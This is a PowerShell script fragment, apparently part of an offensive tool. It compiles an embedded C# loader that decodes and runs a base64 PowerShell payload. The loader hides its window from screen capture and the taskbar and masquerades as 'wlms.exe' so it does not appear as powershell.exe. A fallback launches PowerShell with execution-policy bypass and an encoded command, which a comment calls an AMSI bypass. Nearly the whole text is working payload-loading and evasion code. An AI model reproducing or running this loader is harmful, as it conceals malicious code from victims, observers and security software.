# Method: Create a .NET runner that applies screenshare exclusion automatically
$runnerCode = @'
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;

class PayloadRunner
{
    [DllImport("user32.dll")]
    static extern bool SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();
    
    [DllImport("user32.dll")]
    static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
    
    [DllImport("user32.dll")]
    static extern int GetWindowLong(IntPtr hWnd, int nIndex);
    
    const uint WDA_EXCLUDEFROMCAPTURE = 0x00000011;
    const int GWL_EXSTYLE = -20;
    const int WS_EX_TOOLWINDOW = 0x00000080;

    static void Main()
    {
        // Apply screenshare exclusion to this window
        IntPtr hWnd = GetConsoleWindow();
        if (hWnd != IntPtr.Zero)
        {
            SetWindowDisplayAffinity(hWnd, WDA_EXCLUDEFROMCAPTURE);
            int exStyle = GetWindowLong(hWnd, GWL_EXSTYLE);
            SetWindowLong(hWnd, GWL_EXSTYLE, exStyle | WS_EX_TOOLWINDOW);
        }
        
        // Run the PowerShell payload internally
        string b64 = "BASE64_PAYLOAD_HERE";
        string script = System.Text.Encoding.Unicode.GetString(Convert.FromBase64String(b64));
        
        using(Runspace rs = RunspaceFactory.CreateRunspace())
        {
            rs.Open();
            using(PowerShell ps = PowerShell.Create())
            {
                ps.Runspace = rs;
                ps.AddScript(script).Invoke();
            }
            rs.Close();
        }
    }
}
'@

# Inject the actual payload
$runnerCode = $runnerCode.Replace('"BASE64_PAYLOAD_HERE"', '"' + $encoded + '"')

# Compile the runner
$runnerPath = "$env:TEMP\wlms.exe"

try {
    Add-Type -TypeDefinition $runnerCode -ReferencedAssemblies "System.Management.Automation" -OutputAssembly $runnerPath -OutputType ConsoleApplication -ErrorAction Stop
    
    # Launch the runner — shows as "wlms.exe" in Task Manager, NOT powershell.exe
    $p = Start-Process -FilePath $runnerPath -WindowStyle Normal -PassThru
    Write-Host "[+] Payload runner launched as wlms.exe (PID: $($p.Id))" -ForegroundColor Green
    Write-Host "[+] Payload window also has screenshare exclusion" -ForegroundColor Green
    
} catch {
    Write-Host "[-] Compilation failed. Using fallback method..." -ForegroundColor Yellow
    
    # Fallback: Launch powershell.exe with AMSI bypass and apply screenshare exclusion
    $p = Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded" -WindowStyle Normal -PassThru
    
    # Wait for window to appear, then apply screenshare exclusion
    Start-Sleep 3
    try {
        $payloadHWnd = (Get-Process -Id $p.Id).MainWindowHandle
        if ($payloadHWnd -and $payloadHWnd -ne [IntPtr]::Zero) {
            [Win.Native]::SetWindowDisplayAffinity($payloadHWnd, [Win.Native]::WDA_EXCLUDEFROMCAPTURE) | Out-Null
            Write-Host "[+] Payload window screenshare exclusion applied (fallback)" -ForegroundColor Green
        }
    } catch {
        Write-Host "[-] Could not apply exclusion to payload window" -ForegroundColor Yellow
    }
}
